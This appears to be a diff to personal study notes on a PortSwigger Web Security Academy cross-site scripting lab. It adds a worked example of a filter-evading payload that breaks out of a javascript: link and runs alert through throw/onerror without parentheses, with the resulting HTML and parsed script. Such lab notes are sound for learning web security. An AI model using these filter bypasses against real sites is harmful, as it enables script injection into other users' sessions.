@@ -62,7 +62,32 @@ which gets converted to:
 
 ##### WAF blocks some characters
 https://portswigger.net/research/xss-without-parentheses-and-semi-colons
-https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
+Sink:
+```html
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
+```
+Payload:
+```
+https://0a1e00d90352e31e86f7868200e60090.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+```
+HTML:
+```html
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
+```
+Parsed JS:
+```js
+fetch('/analytics', {
+    method: 'post',
+    body: '/post?postId=5&'
+}, x = x => {
+    throw /**/
+    onerror = alert,
+    1337
+}
+, toString = x, window + '', {
+    x: ''
+}).finally(_ => window.location = '/')
+```
 ##### Making use of HTML-encoding
 Context:
 ```html
